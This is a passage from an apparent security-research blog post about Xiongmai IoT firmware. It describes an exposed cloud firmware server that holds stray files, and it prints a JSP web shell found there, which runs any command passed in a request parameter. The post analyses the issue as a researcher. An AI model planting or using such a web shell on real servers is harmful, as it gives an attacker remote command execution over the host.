large part, this is because acquiring upgrades isn’t straightforward. For example, as mentioned a few times, I recently purchased a \[Sunba NVR-F8010SE\](https://sunbatech.com/product/nvr-f8010se/). The device arrived using a firmware from 2019. It has no auto-upgrade feature. The Sunba website doesn’t have a firmware file to download for the device. The NVR’s manual doesn’t mention upgrades. So, without any obvious leads, a normal user probably wouldn’t pursue upgrading the system. A normal user isn’t going to find Xiongmai’s firmware server, especially if they’re using a relabled device like Sunba. But there is a firmware download site: \[https://baike.jftech.com/download.html\](https://baike.jftech.com/download.html). \\n\\nXiongmai stores their firmware on \[myhuaweicloud\](https://obs-xm-customer.obs.cn-east-2.myhuaweicloud.com/). From this site, you can get a full directory listing of all available firmware (a vulnerability analyst dream). Interestingly, the firmware server is littered with non-firmware files.\\n\\n\`\`\`xml\\n\\n vuuzcu.jsp/\\n 2021-01-30T05:23:00.929Z\\n "134155a532a368eded42290a2a28bb58"\\n 35\\n \\n 65a011a29cdf8ec533ec3d1ccaae921c\\n \\n \\n STANDARD\\n\\n\\n wp-content/plugins/w3-total-cache/pub/sns.php\\n 2022-04-08T10:26:53.530Z\\n "07b9ab8f8dfa1f3f372a44da3f16cbbf"\\n 96\\n \\n 65a011a29cdf8ec533ec3d1ccaae921c\\n \\n \\n STANDARD\\n\\n\\n wxzqqi.jsp/\\n 2022-11-18T09:30:45.785Z\\n "9d631c65ed74752c7081301986f84fe6"\\n 35\\n \\n 65a011a29cdf8ec533ec3d1ccaae921c\\n \\n \\n STANDARD\\n\\n\\n\`\`\`\\n\\nNaturally, I was interested in what these files were. It’s a bit odd to find \`.php\` and \`.jsp\` files listed amongst the normal firmware \`.zip\`. Examining the file, some appear to be the result of a Nessus scan.\\n\\n\`\`\`\\ncurl https://obs-xm-customer.obs.cn-east-2.myhuaweicloud.com/wp-content/plugins/w3-total-cache/pub/sns.php\\n{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://rfi.nessus.org/rfi.txt"}\\n\`\`\`\\n\\nOthers appear to be broken web shells.\\n\\n\` curl https://obs-xm-customer.obs.cn-east-2.myhuaweicloud.com/poc.jsp/ \`\\n\\n\`\`\`java\\n\\n<%@ page import="java.util.\*,java.io.\*"%>\\n<%\\nif (request.getParameter("cmd") == null) { return }\\nout.println("Command: " + request.getParameter("cmd") + "  
");\\nProcess p = Runtime.getRuntime().exec(request.getParameter("cmd"));\\nOutputStream os = p.getOutputStream();\\nInputStream in = p.getInputStream();\\nDataInputStream dis = new DataInputStream(in);\\nString disr = dis.readLine();\\nwhile ( disr != null ) {\\n out.println(disr);\\n disr = dis.readLine();\\n }\\n}\\n\\n%>\\n\`\`\`\\n\\nNeither of which inspire confidence. One “fun” fact about the firmware for these devices is that they lack a digital signature that covers the entire firmware. It’s fairly trivial to introduce malicious content to a “valid” firmware. If an attacker can upload webshells to this firmware server, can they upload malicious firmware? \*I’ve seen no evidence of this\*, and it could be that we’re seeing the results of an authorized Nessus scan. But, like I said, the state of the firmware server doesn’t inspire confidence.\\n\\n## Conclusion and About VulnCheck\\n\\nYou might not find Xiongmai vulnerabilities on the CISA Known Exploited Vulnerabilities Catalog, and it might be hard to track down high quality public exploits for some of these vulnerabilities. But they are being exploited in the wild. And with a couple hundred thousand systems internet-facing systems, Xiongmai products are of clear value to any attacker, whether that be a botnet or someone looking to pivot inward. \\n\\nVulnCheck conducted this research as part of our interest in Initial Access vulnerabilities. VulnCheck has developed proof of concept scanners and exploits, generated PCAPs, and created Suricata rules for all of the mentioned Xiongmai vulnerabilities for our Initial Access Intelligence customers.\\n

#### [Source](https://vulncheck.com/blog/xiongmai-iot-exploitation)

<br/>
---
